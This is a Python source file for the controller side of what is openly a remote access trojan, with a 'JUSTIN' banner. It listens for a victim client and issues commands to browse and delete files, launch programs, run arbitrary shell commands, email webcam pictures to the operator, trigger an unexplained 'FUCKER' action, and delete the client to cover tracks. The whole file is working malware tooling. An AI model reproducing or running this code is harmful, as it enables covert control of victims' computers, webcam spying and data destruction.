import os
import socket

os.system("cls")
s = socket.socket()


host = socket.gethostname()
host_ip = socket.gethostbyname(host)


port = 8080




print(""" \u001b[31m
         ___  __   __  _______  _______  ___   __    _ 
        |   ||  | |  ||       ||       ||   | |  |  | |
        |   ||  | |  ||  _____||_     _||   | |   |_| |
        |   ||  |_|  || |_____   |   |  |   | |       |
     ___|   ||       ||_____  |  |   |  |   | |  _    |
    |       ||       | _____| |  |   |  |   | | | |   |
    |_______||_______||_______|  |___|  |___| |_|  |__|

""")









print("\u001b[32m")

s.bind((host,port))
print("Server is running on", host_ip)
print("Waiting for incoming client...")
s.listen(1)

conn, addr = s.accept()

print(addr, "Has connected to the sever")


print("\u001b[31m")

while 1:
    command = input(str("Command >>> \u001b[37m"))
    

    if command == "cd":
        conn.send(command.encode())
        files = conn.recv(5000)
        files = files.decode()
        print("")
        print(files)
        print("")
        print("\u001b[31m")



    elif command == "dir":
        conn.send(command.encode())
        user_input = input(str(":"))
        conn.send(user_input.encode())
        files = conn.recv(5000)
        files = files.decode()
        print(files)
        print("\u001b[31m")




    elif command == "help":
        print("")
        print("\u001b[36m dir = browse the files ")
        print("")
        print("\u001b[34m cd = shows the path where the client is installed")
        print("")
        print("\u001b[36m del = senter path of file you want to delete")
        print("")
        print("\u001b[34m start = enter path of file you want to start")
        print("")
        print("\u001b[36m FUCKER = test it :)")
        print("")
        print("\u001b[34m cam = enter email you want to send webcam picture")
        print("")
        print("\u001b[36m cmd = execute a command in cmd")
        print("")
        print("\u001b[34m exit = close the connection and delete the client")
        print("")
        print("\u001b[31m")


    elif command == "del":
        conn.send(command.encode())
        user_input2 = input(str(":"))
        conn.send(user_input2.encode())
        delINFO = conn.recv(5000)
        delINFO = delINFO.decode()
        print("")
        print(delINFO)
        print("")
        print("\u001b[31m")


    elif command == "start":
        conn.send(command.encode())
        user_input3 = input(str(":"))
        conn.send(user_input3.encode())
        startINFO = conn.recv(5000)
        startINFO = startINFO.decode()
        print("")
        print(startINFO)
        print("")
        print("\u001b[31m")


    elif command == "FUCKER":
        conn.send(command.encode())
        print("")
        print("STARTED...")
        print("")
        infoFUCKER = conn.recv(5000)
        infoFUCKER = infoFUCKER.decode()
        print("")
        print(infoFUCKER)
        print("")
        print("\u001b[31m")


    elif command == "cam":
         conn.send(command.encode())
         user_input4 = input(str("your email: "))
         conn.send(user_input4.encode())
         infoCAM = conn.recv(5000)
         infoCAM = infoCAM.decode()
         print("")
         print(infoCAM)
         print("")
         print("\u001b[31m")


    elif command == "cmd":
        conn.send(command.encode())
        user_input5 = input(str(": "))
        conn.send(user_input5.encode())
        infoCMD = conn.recv(5000)
        infoCMD = infoCMD.decode()
        print("")
        print(infoCMD)
        print("")
        print("\u001b[31m")

    elif command == "exit":
        print("")
        print("you really want to close the connection and delete the client?")
        print("")
        print("y = yes")
        print("n = no")
        a = input("you really want to close the connection and delete the client?\n")
        
        if a == "y":
            conn.send(command.encode())
            exit()

        else:
            exit()



    else:
        print("")
        print("NOT FOUND!")
        print("")
        print("\u001b[31m")